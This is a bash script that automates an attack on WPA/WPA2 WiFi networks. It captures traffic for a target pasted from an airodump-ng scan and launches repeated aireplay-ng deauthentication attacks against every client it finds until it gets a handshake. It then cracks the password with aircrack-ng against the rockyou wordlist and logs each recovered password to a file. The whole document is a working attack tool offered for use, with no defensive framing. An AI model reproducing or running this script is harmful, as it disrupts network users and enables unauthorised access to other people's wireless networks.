#!/bin/bash

UN=$SUDO_USER
path="/home/$UN/Desktop/wifi_Targets"
mkdir -p "$path"
sudo chown -R $UN:$UN $path

read -p "Paste the line (BSSID, Channel, Name):" input_string
echo

# Extracting values from airodump-ng scan by pasting one row manually:
bssid_name=$(echo "$input_string" | awk '{for (i=1; i<=NF; i++) if ($i == "PSK" || $i == "SAE" || $i == "OPN" || $i == "MGT") { for (j=i+1; j<=NF; j++) printf "%s%s", $j, (j==NF ? "\n" : " "); break } }')
bssid_address=$(echo "$input_string" | awk '{print $1}')
encryption=$(echo "$input_string" | awk '{print $8}')
channel=$(echo "$input_string" | awk '{print $6}')

clear

# FIX IT!! chinease/spaces/Special characters!!!!!!!!
# Remove "/" from bssid name
if [[ $bssid_name == *"/"* ]]; then
    bssid_name=${bssid_name//\//}  # Remove "/"
fi

if [[ $input_string == *"<length:  0>"* ]]; then
    echo -e "\033[1m\nNot a valid network.\033[0m\n"
    exit 1
fi

# Echo values
echo -e "\033[1;31m\033[1mBSSID Name:\033[0m $bssid_name"
echo -e "\033[1;31m\033[1mMAC Address:\033[0m $bssid_address"
if [ "$encryption" = "OPN" ]; then
    echo -e "\033[1;31m\033[1mEncryption:\033[0m none"
else
    echo -e "\033[1;31m\033[1mEncryption:\033[0m $encryption"
fi
echo -e "\033[1;31m\033[1mChannel:\033[0m $channel"
echo
echo

if [ "$encryption" = "WPA3" ]; then
    echo -e "\033[1mThe encryption is WPA3. Can't crack it yet.\033[0m"
    exit 1
elif [ "$encryption" = "OPN" ]; then
    echo -e "\033[1mThe Network is open.\033[0m" 
    exit 1
fi



# if directory exist from previous scan then delete it & create new
if [ -d $path/"$bssid_name" ]; then
    rm -r $path/"$bssid_name"
fi
mkdir $path/"$bssid_name"



# Scan 30 seconds for devices:
gnome-terminal --geometry=100x20+250+120 -- script -c "sudo airodump-ng -c $channel -w '$path/$bssid_name/$bssid_name' -d $bssid_address wlan0mon" "$path/$bssid_name/airodump_output.txt" &
sleep 4

# Check if the network exists
if [ "$(grep -c "$bssid_address" "$path/$bssid_name/airodump_output.txt")" -lt 2 ]; then
    sudo pkill airodump-ng
    echo -e "\033[1mThe Network appear to be offline now.\033[0m"
    rm -r $path/"$bssid_name"
    exit 1
fi


for ((i=1; i<=10; i++)); do
    target_devices=$(sudo grep -oP '(?<=<client-mac>).*?(?=</client-mac>)' "$path/$bssid_name/$bssid_name-01.kismet.netxml")

    if [ -n "$target_devices" ]; then
        echo -e "\033[1;33m\nDevices_Found:\033[0m $target_devices" | tr ' ' '\n'
        echo
        break
    fi
    echo -e "Scanning for devices..  \e[1;34m$i/10\e[0m"
    sleep 3
done


if [ -z "$target_devices" ]; then
    echo -e "\033[1m\nNo device were found.\033[0m"
    sudo pkill airodump-ng
    rm -r $path/"$bssid_name"
    exit 1
fi



sleep 3


# Check if we capture the handshake:
if sudo grep -q "WPA handshake: $bssid_address" "$path/$bssid_name/airodump_output.txt"; then
    echo -e "\033[1;32m->> Got the handshake!\033[0m"
    sudo pkill aireplay-ng
    sudo pkill airodump-ng
    echo
    echo --- >> $path/wifi_passwords.txt
    echo "We got handshake for:    	$bssid_name                   .     at $(date +"%H:%M %d/%m/%y")" >> "$path/wifi_passwords.txt"


# Starting deauth attack and waiting for handshake:      
else
    echo -e "\033[1m\nStarting deauth attack ->>\033[0m"
    # trying 10 times (3 minutes) the deauth attack
    for ((i=1; i<=10; i++)); do        
        target_devices=$(sudo grep -oP '(?<=<client-mac>).*?(?=</client-mac>)' "$path/$bssid_name/$bssid_name-01.kismet.netxml")
        
        for target_device in $target_devices; do
            gnome-terminal --geometry=100x20-250+120 -- sudo timeout 5s aireplay-ng --deauth 0 -a "$bssid_address" -c "$target_device" wlan0mon &
        done
        
        echo -e "Attempt \e[1;34m$i/10\e[0m to capture handshake of:"         
        echo -e "$target_devices" | tr ' ' '\n',
        echo
        # waiting 18 sec after deauth attack while looking for handshake:
        for ((j=1; j<=18; j++)); do
            sleep 1
	    if sudo grep -q "WPA handshake: $bssid_address" "$path/$bssid_name/airodump_output.txt"; then
                echo -e "\033[1;32m->> Got the handshake!\033[0m"
                sudo pkill aireplay-ng
	        sudo pkill airodump-ng
	        echo
	        echo --- >> $path/wifi_passwords.txt
	        echo "We got handshake for:   $bssid_name                  ($(date +"%H:%M %d/%m/%y"))" >> "$path/wifi_passwords.txt"
	        break 2
	    fi    
        done
    # after 6 unseccessfull attempts, quit the script:
    if [ "$i" == 10 ]; then
    	echo -e "\033[1m\nNo handshake obtained within 2 minutes.\033[0m"
    	sudo pkill aireplay-ng
        sudo pkill airodump-ng
        rm -r $path/"$bssid_name"
	exit 1
    fi    
  
    done       
fi


sudo chown -R $UN:$UN $path


# Cracking the Password
echo -e "\e[1m\nCracking the wifi password with rockyou wordlist ->>\n\e[0m"


sudo aircrack-ng "$path/$bssid_name/$bssid_name"*.cap -w /usr/share/wordlists/rockyou.txt -l "$path/$bssid_name/$bssid_name-wifi_password.txt"
echo
if [ -f "$path/$bssid_name/$bssid_name-wifi_password.txt" ]; then
    wifi_pass=$(cat "$path/$bssid_name/$bssid_name-wifi_password.txt")
    echo -e "The wifi password of \033[1;31m\033[1m$bssid_name\033[0m is:	\033[1;31m\033[1m$wifi_pass\033[0m"
    echo "The wifi password is:   $wifi_pass" >> $path/wifi_passwords.txt
else
    echo -e "\nCouldn't finf a match from rockyou wordlist.."
fi




#sudo airmon-ng stop wlan0mon && sudo systemctl start NetworkManager

